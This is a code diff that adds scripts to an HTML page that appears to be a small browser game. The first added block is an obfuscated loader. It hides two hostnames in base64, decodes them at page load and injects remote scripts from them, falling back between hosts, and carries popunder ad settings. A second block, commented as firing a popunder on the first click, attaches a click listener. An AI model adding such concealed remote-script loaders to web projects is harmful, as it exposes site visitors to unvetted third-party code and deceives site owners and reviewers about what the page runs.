@@ -117,6 +117,11 @@ button{
     }
 }
 </style>
+    <script type="text/javascript" data-cfasync="false">
+    /*<![CDATA[/* */
+    (function(){var o=window,d="cdd460bd6a700a2b233fdb056a1b7f41",u=[["siteId",976-32+370+9+5308814],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],w=["d3d3LmludGVsbGlnZW5jZWFkeC5jb20vZmV4Ti9tanNlbC5taW4uanM=","ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvdlBkcFMvclhLdHBiL29yZXNwb25zaXZlLW5hdi5taW4uY3Nz"],b=-1,p,z,y=function(){clearTimeout(z);b++;if(w[b]&&!(1808207535000<(new Date).getTime()&&1<b)){p=o.document.createElement("script");p.type="text/javascript";p.async=!0;var r=o.document.getElementsByTagName("script")[0];p.src="https://"+atob(w[b]);p.crossOrigin="anonymous";p.onerror=y;p.onload=function(){clearTimeout(z);o[d.slice(0,16)+d.slice(0,16)]||y()};z=setTimeout(y,5E3);r.parentNode.insertBefore(p,r)}};if(!o[d]){try{Object.freeze(o[d]=u)}catch(e){}y()}})();
+    /*]]>/* */
+    </script>
 </head>
 <body>
 
@@ -265,5 +270,17 @@ newRound();
 
 </script>
 
+    <script>
+    // Fire popunder on first user click (game interaction)
+    (function(){
+        var fired = false;
+        document.addEventListener('click', function handler(){
+            if(!fired){
+                fired = true;
+                document.removeEventListener('click', handler);
+            }
+        });
+    })();
+    </script>
 </body>
 </html>
